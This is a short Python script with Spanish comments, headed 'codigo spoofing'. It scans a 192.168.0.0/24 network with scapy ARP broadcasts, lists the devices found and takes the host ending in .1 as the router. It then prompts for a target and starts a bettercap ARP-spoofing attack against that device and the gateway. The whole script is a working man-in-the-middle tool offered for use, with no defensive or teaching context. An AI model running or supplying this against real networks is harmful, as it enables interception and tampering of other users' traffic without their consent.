##codigo spoofing

import subprocess
import scapy.all as scapy

def scan_network(ip_range):
    devices = []
    for i in range(1, 255):  # Escanea los últimos 254 IPs en el rango 192.168.0.1-192.168.0.254
        ip = f"192.168.0.{i}"
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        for element in answered_list:
            device_info = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            devices.append(device_info)

    return devices

def get_router_info(devices):
    for device in devices:
        if device['ip'].endswith('.1'):  # Asumiendo que la IP del router termina en .1
            return device['ip'], device['mac']
    return None, None

def display_devices(devices):
    print("Dispositivos en la red:")
    for idx, device in enumerate(devices):
        print(f"{idx + 1}. IP: {device['ip']}, MAC: {device['mac']}")

def arp_spoof(router_ip, target_ip):
    subprocess.call(["bettercap", "-eval", f"set arp.spoof.targets {target_ip}; set arp.spoof.gateway {router_ip}; arp.spoof on"])

def main():
    # No se solicitará al usuario ingresar el rango, se utilizará automáticamente 192.168.0.0/24
    devices = scan_network("192.168.0.0/24")

    if devices:
        display_devices(devices)
        router_ip, router_mac = get_router_info(devices)
        
        if router_ip and router_mac:
            print(f"Router IP: {router_ip}, Router MAC: {router_mac}")
            target_idx = int(input("Ingresa el número del dispositivo objetivo: ")) - 1
            if 0 <= target_idx < len(devices):
                target_ip = devices[target_idx]['ip']
                arp_spoof(router_ip, target_ip)
            else:
                print("Índice de dispositivo no válido.")
        else:
            print("No se pudo encontrar la IP y MAC del router.")
    else:
        print("No se encontraron dispositivos en la red.")

if __name__ == "__main__":
    main()
